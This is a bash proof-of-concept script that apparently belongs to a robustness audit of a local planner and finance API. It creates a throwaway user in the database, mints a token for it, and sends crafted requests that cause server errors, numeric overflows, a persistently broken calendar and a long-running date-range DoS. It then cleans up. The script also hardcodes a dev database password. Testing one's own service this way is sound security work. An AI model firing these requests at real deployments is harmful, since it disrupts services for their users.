#!/usr/bin/env bash
# Adversarial robustness PoC against the RUNNING API (http://localhost:5080).
# Reproduces every server-side 500 / overflow / DoS found in section 02.
#
# Prereqs: API up on :5080, MySQL container `planner-mysql` up, Node present.
# The script mints a JWT for an ISOLATED throwaway user it creates, runs the
# attacks, and cleans up after itself. EXECUTED 2026-11-04, results in section 02.
#
# Usage:  bash server_poc.sh
set -u
API=http://localhost:5080
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MYSQL='docker exec planner-mysql mysql -uplanner -pplanner_dev_password -N planner'

# --- create isolated throwaway user ---
EMAIL="adv_robustness_poc@gmail.com"
$MYSQL -e "INSERT IGNORE INTO Users (Email,PasswordHash,CreatedAt,IsEmailConfirmed,Nickname,LastActiveAt,QuickAddUnlocked,QuickAddUsedCount) VALUES ('$EMAIL','x',UTC_TIMESTAMP(),1,'advpoc',UTC_TIMESTAMP(),1,0);" 2>/dev/null
TUID=$($MYSQL -e "SELECT Id FROM Users WHERE Email='$EMAIL';" 2>/dev/null | tr -d '\r')
echo "throwaway user id = $TUID"
TOKEN=$(node "$HERE/mint_token.mjs" "$TUID" "$EMAIL")
AUTH=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json")

code() { curl -s -m 60 -o /tmp/advr.txt -w "%{http_code}" "$@"; }

echo
echo "## F1  GET /api/finance/stats — unvalidated year -> new DateTime(year,1,1)"
for q in "" "?year=0&month=1" "?year=99999&month=1" "?year=2026&month=5"; do
  echo "  stats$q -> $(code "$API/api/finance/stats$q" "${AUTH[@]}")"
done

echo
echo "## F2  PUT /api/finance/limit — amount NOT clamped -> decimal(18,2) overflow"
echo "  amount=1e17 -> $(code -X PUT "$API/api/finance/limit" "${AUTH[@]}" -d '{"periodType":"Week","amount":100000000000000000}')"
echo "  amount=-5000 (negative accepted, logic bug) -> $(code -X PUT "$API/api/finance/limit" "${AUTH[@]}" -d '{"periodType":"Month","amount":-5000}')"

echo
echo "## F3  POST /api/shopping-list/receipt-total — total NOT clamped -> overflow"
echo "  total=1e17 -> $(code -X POST "$API/api/shopping-list/receipt-total" "${AUTH[@]}" -d '{"total":100000000000000000}')"

echo
echo "## F4  RECURRENCE pattern int.Parse -> persistent 500 on the whole calendar"
RULE='{"title":"poc","type":"MonthDays","timeOfDay":"09:00:00","startDate":"2026-11-04","endDate":"2027-01-01","monthDayMode":"Specific","monthDays":"abc"}'
echo "  create rule monthDays='abc' -> $(code -X POST "$API/api/recurrence-rules" "${AUTH[@]}" -d "$RULE")"
echo "  GET /api/tasks/day    -> $(code "$API/api/tasks/day?date=2026-11-10" "${AUTH[@]}")  (expect 500)"
echo "  GET /api/tasks/period -> $(code "$API/api/tasks/period?from=2026-11-04&to=2026-11-11" "${AUTH[@]}")  (expect 500)"
RULE2='{"title":"poc2","type":"WeekCycle","timeOfDay":"09:00:00","startDate":"2026-11-04","endDate":"2027-01-01","cycleWeeks":1,"weekDaysPattern":"0:abc"}'
echo "  create rule weekDaysPattern='0:abc' -> $(code -X POST "$API/api/recurrence-rules" "${AUTH[@]}" -d "$RULE2")"
echo "  GET /api/tasks/day    -> $(code "$API/api/tasks/day?date=2026-11-10" "${AUTH[@]}")  (expect 500)"
for id in $($MYSQL -e "SELECT Id FROM RecurrenceRules WHERE UserId=$TUID;" 2>/dev/null | tr -d '\r'); do
  code -X DELETE "$API/api/recurrence-rules/$id" "${AUTH[@]}" >/dev/null; echo "  cleanup deleted rule $id"
done

echo
echo "## F5  GET /api/tasks/free-days — unclamped from..to loop (DoS + overflow 500)"
t0=$(date +%s%3N); C=$(code "$API/api/tasks/free-days?from=0001-01-01&to=9999-12-31&minHours=2" "${AUTH[@]}"); t1=$(date +%s%3N)
echo "  full DateOnly range -> $C (DateOnly.AddDays overflow) in $((t1-t0)) ms"

echo
echo "## negative control: StartDateTime year-0001 is accepted (NOT vulnerable)"
echo "  POST /api/tasks startDateTime=0001-01-01 -> $(code -X POST "$API/api/tasks" "${AUTH[@]}" -d '{"title":"x","startDateTime":"0001-01-01T00:00:00"}')"

echo
echo "## CLEANUP throwaway user + data"
$MYSQL -e "DELETE FROM Tasks WHERE UserId=$TUID; DELETE FROM RecurrenceRules WHERE UserId=$TUID; DELETE FROM FinanceLimits WHERE UserId=$TUID; DELETE FROM FinanceTransactions WHERE UserId=$TUID; DELETE FROM FinanceAccounts WHERE UserId=$TUID; DELETE FROM UserProfiles WHERE UserId=$TUID; DELETE FROM Users WHERE Id=$TUID;" 2>/dev/null
echo "  done."
